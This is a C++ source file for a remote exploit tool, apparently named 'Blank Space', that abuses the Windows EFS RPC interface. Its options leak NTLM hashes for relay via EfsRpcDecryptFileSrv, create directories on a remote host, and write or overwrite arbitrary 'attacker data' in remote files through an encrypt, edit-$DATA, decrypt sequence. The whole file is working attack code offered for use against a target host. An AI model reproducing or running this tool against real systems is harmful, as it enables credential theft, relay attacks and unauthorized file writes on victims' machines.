#include "popl.hpp"
#include "efsrpc_wrapper.hpp"

#include <string>
#include <iostream>
#include <fstream>

namespace
{
	void print_banner()
	{
		std::cout << " ____    ___                    __          ____" << std::endl;
		std::cout << "/\\  _`\\ /\\_ \\                  /\\ \\        /\\  _`\\" << std::endl;
		std::cout << "\\ \\ \\L\\ \\//\\ \\      __      ___\\ \\ \\/'\\    \\ \\,\\L\\_\\  _____      __      ___     __" << std::endl;
		std::cout << " \\ \\  _ <'\\ \\ \\   /'__`\\  /' _ `\\ \\ , <     \\/_\\__ \\ /\\ '__`\\  /'__`\\   /'___\\ /'__`\\" << std::endl;
		std::cout << "  \\ \\ \\L\\ \\\\_\\ \\_/\\ \\L\\.\\_/\\ \\/\\ \\ \\ \\\\`\\     /\\ \\L\\ \\ \\ \\L\\ \\/\\ \\L\\.\\_/\\ \\__//\\  __/" << std::endl;
		std::cout << "   \\ \\____//\\____\\ \\__/.\\_\\ \\_\\ \\_\\ \\_\\ \\_\\   \\ `\\____\\ \\ ,__/\\ \\__/.\\_\\ \\____\\ \\____\\" << std::endl;
		std::cout << "    \\/___/ \\/____/\\/__/\\/_/\\/_/\\/_/\\/_/\\/_/    \\/_____/\\ \\ \\/  \\/__/\\/_/\\/____/\\/____/" << std::endl;
		std::cout << "                                                        \\ \\_\\" << std::endl;
		std::cout << "                                                         \\/_/" << std::endl;
	}

	bool leak_hash(const std::string& p_rhost, const std::string& p_rfile)
	{
		std::cout << "[+] Creating EFS RPC binding handle to " << p_rhost << std::endl;
		RPC_BINDING_HANDLE bind_handle = create_binding_handle(p_rhost);
		if (INVALID_HANDLE_VALUE == bind_handle)
		{
			return false;
		}

		std::cout << "[+] Sending EfsRpcDecryptFileSrv for " << p_rfile << std::endl;
		long status = 0;
		if (!decrypt_remote_file(bind_handle, p_rfile, status))
		{
			if (status == 53)
			{
				std::cout << "[+] Network path not found error received!" << std::endl;
				RpcBindingFree(&bind_handle);
				return true;
			}
		}

		std::cout << "[-] Failure :( Bad error code." << std::endl;
		RpcBindingFree(&bind_handle);
		return false;
	}

	bool make_directory(const std::string& p_rhost, const std::string& p_rfile)
	{
		std::cout << "[+] Creating EFS RPC binding handle to " << p_rhost << std::endl;
		RPC_BINDING_HANDLE bind_handle = create_binding_handle(p_rhost);
		if (INVALID_HANDLE_VALUE == bind_handle)
		{
			return false;
		}

		std::cout << "[+] Creating remote directory " << p_rfile << std::endl;
		if (!create_remote_directory(bind_handle, p_rfile))
		{
			RpcBindingFree(&bind_handle);
			return true;
		}

		RpcBindingFree(&bind_handle);
		return false;
	}

	bool write_remote_file(const std::string& p_rhost, const std::string& p_rfile, const std::string& p_file_data)
	{
		std::cout << "[+] Creating EFS RPC binding handle to " << p_rhost << std::endl;
		RPC_BINDING_HANDLE bind_handle = create_binding_handle(p_rhost);
		if (INVALID_HANDLE_VALUE == bind_handle)
		{
			return false;
		}

		// Create the file on the remote host (this also overwrites existing files)
		std::cout << "[+] Attempting to write to " << p_rfile << std::endl;
		if (!create_remote_file(bind_handle, p_rfile))
		{
			RpcBindingFree(&bind_handle);
			return false;
		}

		// Encrypt the empty file we just created on the remote host
		std::cout << "[+] Encrypt the empty remote file..." << std::endl;
		if (!encrypt_remote_file(bind_handle, p_rfile))
		{
			RpcBindingFree(&bind_handle);
			return false;
		}

		// read back the destination file's object
		std::cout << "[+] Reading the encrypted remote file object" << std::endl;
		std::vector<char> remote_enc_data(read_remote_file(bind_handle, p_rfile));
		if (remote_enc_data.empty())
		{
			RpcBindingFree(&bind_handle);
			return false;
		}

		std::cout << "[+] Read back " << remote_enc_data.size() << " bytes" << std::endl;

		// Modify ::$DATA stream to add unencrypted data and write to the remote file
		std::cout << "[+] Writing " << p_file_data.size() << " bytes of attacker data to encrypted object::$DATA stream" << std::endl;
		if (!write_plaintext_to_encrypted_efs(bind_handle, remote_enc_data, p_rfile, p_file_data))
		{
			RpcBindingFree(&bind_handle);
			return false;
		}

		// Decrypt the remote file annnnnd success?
		std::cout << "[+] Decrypt the the remote file" << std::endl;
		if (!decrypt_remote_file(bind_handle, p_rfile))
		{
			RpcBindingFree(&bind_handle);
			return false;
		}

		RpcBindingFree(&bind_handle);
		return true;
	}
}

int main(int p_argc, const char* p_argv[])
{
	print_banner();

	popl::OptionParser op("Available options");
	auto help_option = op.add<popl::Switch>("h", "help", "Produces a help message");
	auto rhost = op.add<popl::Value<std::string>, popl::Attribute::required>("r", "rhost", "The remote host to target");
	auto rfile = op.add<popl::Value<std::string>, popl::Attribute::required>("f", "filename", "The name of the file to create/write to");
	auto sdata = op.add<popl::Value<std::string>>("s", "input-string", "A string of data to write");
	auto fdata = op.add<popl::Value<std::string>>("i", "input-file", "A string of data to write");
	auto relay = op.add<popl::Switch>("", "relay", "Initiate NTLM hash leak");
	auto rdir = op.add<popl::Switch>("", "directory", "Create a directory");

	try
	{
		op.parse(p_argc, p_argv);
	}
	catch (const std::exception& e)
	{
		std::cout << e.what() << std::endl;
		std::cout << op << std::endl;
		return EXIT_FAILURE;
	}

	if (help_option->is_set())
	{
		std::cout << op << std::endl;
		return EXIT_SUCCESS;
	}

	if (relay->is_set())
	{
		if (!leak_hash(rhost->value(), rfile->value()))
		{
			return EXIT_FAILURE;
		}
	}
	else if (rdir->is_set())
	{
		if (!make_directory(rhost->value(), rfile->value()))
		{
			return EXIT_FAILURE;
		}
	}
	else // implied write file
	{
		std::string attacker_data;
		if (sdata->is_set())
		{
			attacker_data.assign(sdata->value());
		}
		else if (fdata->is_set())
		{
			std::ifstream data(fdata->value(), std::ios::binary);
			if (!data.is_open())
			{
				std::cerr << "[-] Failed to open the provided file: " << fdata->value() << std::endl;
				return EXIT_FAILURE;
			}
			attacker_data.assign(std::istreambuf_iterator<char>(data), std::istreambuf_iterator<char>());
			data.close();
		}
		else
		{
			std::cerr << "[-] Input data must be specified" << std::endl;
			return EXIT_FAILURE;
		}

		try
		{
			if (!write_remote_file(rhost->value(), rfile->value(), attacker_data))
			{
				return EXIT_FAILURE;
			}
		}
		catch (const std::exception& e)
		{
			std::cerr << "Exception: " << e.what() << std::endl;
			return EXIT_FAILURE;
		}
	}

	std::cout << "[!] Success!" << std::endl;
	return EXIT_SUCCESS;
}
